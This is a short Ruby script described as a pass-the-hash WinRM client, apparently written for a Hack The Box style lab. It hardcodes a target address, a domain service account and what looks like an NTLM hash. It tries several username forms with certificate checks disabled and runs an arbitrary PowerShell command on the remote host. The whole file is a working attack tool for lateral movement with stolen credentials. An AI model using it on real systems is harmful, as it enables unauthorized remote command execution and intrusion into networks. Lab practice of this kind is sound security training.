#!/usr/bin/env ruby
# Minimal WinRM PTH client using installed winrm gem
require 'winrm'

host = ARGV[0] || '172.16.0.10'
user = ARGV[1] || 'odyssey\\svc-aegis-deploy'
hash = ARGV[2] || '3a5026b2aa5ef2cbb7cb6a7be3a2bcfa'
cmd  = ARGV[3] || 'whoami'

endpoint = "http://#{host}:5985/wsman"

[
  { user: user, password: hash },
  { user: 'svc-aegis-deploy', password: hash, realm: 'odyssey.htb' },
  { user: 'ODYSSEY\\svc-aegis-deploy', password: hash },
].each_with_index do |creds, i|
  puts "try #{i}: #{creds.inspect}"
  begin
    conn = WinRM::Connection.new(
      endpoint: endpoint,
      transport: :negotiate,
      user: creds[:user],
      password: creds[:password],
      realm: creds[:realm],
      no_ssl_peer_verification: true
    )
    conn.shell(:powershell) do |shell|
      output = shell.run(cmd)
      puts "STDOUT: #{output.stdout}"
      puts "STDERR: #{output.stderr}"
      puts "CODE: #{output.exitcode}"
    end
    puts 'WINRM_RUBY_OK'
    break
  rescue => e
    puts "FAIL #{e.class}: #{e.message}"
  end
end
